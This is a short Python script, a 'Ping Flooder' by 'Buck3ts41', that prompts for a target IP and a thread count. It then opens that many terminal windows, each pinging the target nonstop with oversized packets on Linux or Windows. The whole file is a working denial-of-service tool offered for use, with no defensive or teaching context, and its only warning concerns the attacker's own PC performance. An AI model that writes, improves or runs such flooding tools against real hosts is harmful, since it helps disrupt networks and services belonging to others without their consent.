import os
import sys
import platform
import subprocess
import time
from art import *
from colorama import Fore, Style

def check_dependencies():
    try:
        import art
        import colorama
    except ImportError:
        print(Fore.RED + '[-] Failed to import required modules.')
        install_dependencies()
        sys.exit(1)

def install_dependencies():
    print(Fore.YELLOW + '   [*] Installing missing dependencies...')
    if platform.system() == 'Linux':
        os.system("pip3 install -r requirements.txt")
    elif platform.system() == 'Windows':
        os.system("python -m pip install -r requirements.txt")
    print(Fore.YELLOW + " [!] Dependencies installed, restart the script")
    time.sleep(1.5)

def clear_screen():
    if platform.system() == 'Linux':
        os.system("clear")
    elif platform.system() == 'Windows':
        os.system("cls")

def print_banner():
    clear_screen()
    tprint("Ping - Flooder")
    print("Script by Buck3ts41", '\n')
    print("V 2.0")
    if platform.system() == 'Linux':
        print(Fore.BLUE + " [+] Ping Flooder running on Linux", '\n')
    elif platform.system() == 'Windows':
        print(Fore.BLUE + " [+] Ping Flooder running on Windows", '\n')
    print(Fore.GREEN + " [!] Thread --> ", pwr)
    print(Fore.GREEN + " [!] Target --> ", target)
    time.sleep(2)

def get_user_input():
    global pwr, target
    pwr = int(input("Thread: "))
    target = input("Target IP: ")

def start_ping_flood():
    if platform.system() == 'Linux':
        for _ in range(pwr):
            subprocess.Popen(['xterm', '-e', 'ping', str(target), '-i', '0.2', '-s', '1999'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)

    elif platform.system() == 'Windows':
        for _ in range(pwr):
            subprocess.Popen(['start', 'cmd', '/k', 'ping', '-t', '-l', '1999', str(target)], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)

    clear_screen()
    print(Fore.CYAN + " [!] Started")
    time.sleep(5)

def main():
    check_dependencies()
    get_user_input()

    if pwr > 20:
        warning = input(Fore.RED + " [-] High power can affect PC performance, continue? (y/n): ")
        if warning.lower() != 'y':
            sys.exit(1)

    print_banner()
    start_ping_flood()

if __name__ == "__main__":
    main()
